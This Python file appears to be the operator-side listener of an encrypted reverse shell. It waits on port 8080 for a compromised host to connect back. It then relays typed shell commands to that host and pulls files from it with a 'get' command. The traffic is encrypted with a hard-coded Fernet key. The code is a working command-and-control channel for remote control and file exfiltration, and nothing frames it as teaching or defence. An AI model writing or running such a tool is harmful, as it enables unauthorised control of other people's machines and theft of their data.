import socket
from printlib import *
from os import path,remove
from cryptography.fernet import Fernet

iv = ""
key = b"2dx_RB2Ike6XOIup0MgkAJ7uUDgq4-J2if2KNKgUIGo="

listening_port = 8080
listening_ip = "0.0.0.0"

def new_cipher():
    pass

def encrypt(plain_text):            #accepts a plaintext (unencoded) string
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(plain_text.encode('utf-8'))
    return cipher_text              #Returns an encoded string

def decrypt(cipher_text):           #accepts an encoded string    
    if type(cipher_text) is not bytes:
        cipher_text = cipher_text.encode('utf-8')
    cipher_suite = Fernet(key)
    print("CIPHER:", cipher_text)
    plain_text = cipher_suite.decrypt(cipher_text)
    return plain_text                #Returns an encoded string

def send_data(s, plain_text):
    #s.send(encrypt(msg)+b"[END]")
    s.send(encrypt(plain_text))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def file_transfer(conn, command):
    
    send_data(conn, command)
    file = command.split()
    if len(file) > 2:
        dest_filename = file[2]
    else:
        dest_filename = file[1]

    
    f = open(dest_filename,'wb')
    while True: 
        data = decrypt(conn.recv(128).decode('utf-8'))
        data = data.encode('utf-8')
        if b"FILE_NOT_FOUND" in data:
            print_fail("File not found")
            f.close()
            remove(dest_filename)
            break
        if data.endswith(b"DONE"):
            print_good("Transfer completed")
            break
        else:
            f.write(data)
        f.close()

def kill_session(conn, command, source):
    print_info("Killing {}".format(source))
    send_data(conn, command)
    conn.close()

def connect():
    data = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((listening_ip, listening_port))
    s.listen(1)
    print_info("Listening for incoming TCP connection on {}:{}".format(listening_ip,listening_port))
    conn, addr = s.accept()
    source = "{}:{}".format(addr[0],addr[1])
    print_good("We got a connection from: {}".format(source))

    try:
        while True:
            prompt = source + ">"
            command = input(prompt) # Get user input and store it in command variable
            #print(command)
            if 'kill' in command: # If we got terminate command, inform the client and close the connect and break the loop
                kill_session(conn, command, source)
                break
            elif 'get' in command:
                path_exists = True
                if len(command.split()) == 1:
                    print_warn("Incomplete command") 
                else:
                    if len(command.split())== 3:
                        if path.dirname(command.split()[2]) != "":
                            path_exists = path.exists(path.dirname(command.split()[2]))
                        if path_exists:
                            file_transfer(conn, command)
                        else:
                            print_warn("Destination file path does not exist")
            elif command == "":
                pass
            else:
                data = ""
                send_data(conn, command)
                send_data(conn, "[END]")
                #print_info("Sent:\n"+command)
                while not data.endswith('[END]'):
                    recv = conn.recv(128)
                    recv_decrypted = decrypt(recv)
                    if type(recv_decrypted) is bytes:
                        recv_decoded = recv_decrypted.decode('utf-8')
                    data = data + recv_decoded
                print(data)
                data = ""
    except KeyboardInterrupt:
        kill_session(conn,"kill", source)

def main ():
    connect()
main()